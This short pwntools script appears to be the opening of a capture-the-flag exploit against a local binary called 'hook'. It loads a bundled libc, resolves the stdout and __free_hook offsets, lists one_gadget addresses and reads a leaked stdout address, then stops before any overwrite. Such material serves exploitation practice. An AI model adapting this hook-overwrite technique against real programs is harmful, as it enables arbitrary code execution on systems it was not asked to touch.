from pwn import *

p = process("./hook", env={"LD_PRELOAD":"./libc.so.6"})

e = ELF('./hook')
libc = ELF('./libc.so.6')

IO_STDOUT_OFFSET = libc.symbols["_IO_2_1_stdout_"]
FREE_HOOK_OFFSET = libc.symbols["__free_hook"]
ONE_GADGET = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

p.recvuntil(b'stdout: ')

print(len(p.recvuntil(b'\n', drop=True)))